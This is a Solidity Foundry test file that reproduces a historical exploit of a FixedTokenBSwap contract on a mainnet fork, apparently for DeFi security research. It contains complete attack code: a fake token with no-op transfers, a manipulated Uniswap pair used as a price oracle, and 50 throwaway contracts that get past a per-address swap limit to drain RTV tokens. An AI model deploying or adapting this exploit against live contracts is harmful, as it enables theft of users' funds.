// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2,203.63 USD
// Attacker : 0x5FF8645BbC6c8B4390aA228A3e8bf08240F333b4
// Attack Contract : 0xDc1d6a8c90735eABa3d34395B9FFe160E1daAc02
// Vulnerable Contract : 0x746b3d7E9953cDaa8C4d4Fd3ee24fE133f459F32
// Attack Tx : https://etherscan.io/tx/0x5db22f0edc1a9eda5343573da27dd2168c8a36a7f948401db76e22ba1fab71ea
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x746b3d7E9953cDaa8C4d4Fd3ee24fE133f459F32#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1280
//
// Attack summary: FixedTokenBSwap.swap trusts UniswapV2 getAmountsIn for a user-supplied path and then sends
// a fixed 10 RTV to msg.sender after tokenA.transferFrom succeeds. The attacker created a fake token whose
// balanceOf made a fresh RTV/fake-token pair quote expensive fake-token input, while transferFrom was a no-op.
// Fresh helper contracts bypassed the one-swap-per-address daily gate and drained RTV from the swap contract.

address constant ATTACKER = 0x5FF8645BbC6c8B4390aA228A3e8bf08240F333b4;
address constant ATTACK_CONTRACT = 0xDc1d6a8c90735eABa3d34395B9FFe160E1daAc02;
address constant FIXED_TOKEN_B_SWAP = 0x746b3d7E9953cDaa8C4d4Fd3ee24fE133f459F32;
address constant RTV_TOKEN = 0x61e24Ce4efe61EB2efd6AC804445df65f8032955;
address constant RTV_IMPLEMENTATION = 0xadE5f7f7a3f8DB0A9256567e55fF793e3c9bBF14;
address constant HISTORICAL_FAKE_TOKEN = 0x76C611e34F9CA7aAAd50382ada61740Ec365d9f2;
address constant HISTORICAL_RTV_WETH_PAIR = 0x877E453c453132f3f812984184A20241bBA8dC39;
address constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

interface IFixedTokenBSwap {
    function swap(address[] calldata path, uint256 amountInMax) external;
}

interface ISyncPair {
    function sync() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 22_710_987;
        vm.createSelectFork("mainnet", forkBlock);

        multiAssetLog = true;
        attacker = ATTACKER;
        _addFundingToken(address(0));
        _addFundingToken(RTV_TOKEN);

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical Attack Contract");
        vm.label(FIXED_TOKEN_B_SWAP, "FixedTokenBSwap");
        vm.label(RTV_TOKEN, "RTV Proxy");
        vm.label(RTV_IMPLEMENTATION, "RTV Implementation");
        vm.label(HISTORICAL_FAKE_TOKEN, "Historical Fake Token");
        vm.label(HISTORICAL_RTV_WETH_PAIR, "RTV/WETH Pair");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 Router");
    }

    function testExploit() public balanceLog {
        uint256 seed = 0.01 ether;
        uint256 victimRtvBefore = IERC20(RTV_TOKEN).balanceOf(FIXED_TOKEN_B_SWAP);
        uint256 attackerRtvBefore = IERC20(RTV_TOKEN).balanceOf(ATTACKER);

        assertGt(victimRtvBefore, 500 ether);
        assertEq(IERC20(RTV_TOKEN).balanceOf(ATTACKER), 0);

        // step 1: fund the attacker with the same 0.01 ETH seed used by the historical constructor.
        vm.deal(ATTACKER, seed);
        uint256 attackerEthBefore = ATTACKER.balance;

        // step 2: deploy a source-level reconstruction of the initcode attack.
        vm.prank(ATTACKER);
        new FixedTokenBSwapAttack{value: seed}(payable(ATTACKER));

        // step 3: the attacker keeps ETH profit plus the final 10 RTV that was not sold back to ETH.
        uint256 attackerEthAfter = ATTACKER.balance;
        uint256 attackerRtvProfit = IERC20(RTV_TOKEN).balanceOf(ATTACKER) - attackerRtvBefore;

        assertGt(attackerEthAfter, attackerEthBefore);
        assertGt(attackerEthAfter - attackerEthBefore, 0.4 ether);
        assertEq(attackerRtvProfit, 10 ether);
        assertEq(victimRtvBefore - IERC20(RTV_TOKEN).balanceOf(FIXED_TOKEN_B_SWAP), 500 ether);
    }
}

contract FixedTokenBSwapAttack {
    constructor(
        address payable profitReceiver
    ) payable {
        address[] memory path = new address[](2);
        path[0] = WETH_TOKEN;
        path[1] = RTV_TOKEN;

        // Buy enough RTV to seed a fake-token/RTV pair used only as a pricing oracle.
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER)).swapExactETHForTokens{value: msg.value}(
            0, path, address(this), block.timestamp
        );

        FakeToken fakeToken = new FakeToken();
        address fakePair = IUniswapV2Factory(UNISWAP_V2_FACTORY).createPair(address(fakeToken), RTV_TOKEN);

        IERC20(RTV_TOKEN).transfer(fakePair, IERC20(RTV_TOKEN).balanceOf(address(this)));
        ISyncPair(fakePair).sync();

        // FixedTokenBSwap allows one swap per sender per day, so use fresh senders.
        for (uint256 i = 0; i < 50; i++) {
            new FixedTokenBSwapSingleSwap(address(fakeToken), address(this));
        }

        IERC20(RTV_TOKEN).approve(UNISWAP_V2_ROUTER, type(uint256).max);
        path[0] = RTV_TOKEN;
        path[1] = WETH_TOKEN;
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER)).swapExactTokensForETH(
            490 ether, 0, path, address(this), block.timestamp
        );

        IERC20(RTV_TOKEN).transfer(profitReceiver, IERC20(RTV_TOKEN).balanceOf(address(this)));
        profitReceiver.transfer(address(this).balance);
    }

    receive() external payable {}
}

contract FixedTokenBSwapSingleSwap {
    constructor(address fakeToken, address receiver) {
        address[] memory path = new address[](2);
        path[0] = fakeToken;
        path[1] = RTV_TOKEN;

        IFixedTokenBSwap(FIXED_TOKEN_B_SWAP).swap(path, type(uint256).max);
        IERC20(RTV_TOKEN).transfer(receiver, IERC20(RTV_TOKEN).balanceOf(address(this)));

        selfdestruct(payable(receiver));
    }
}

contract FakeToken {
    function balanceOf(address) external pure returns (uint256) {
        return 100 ether;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }
}
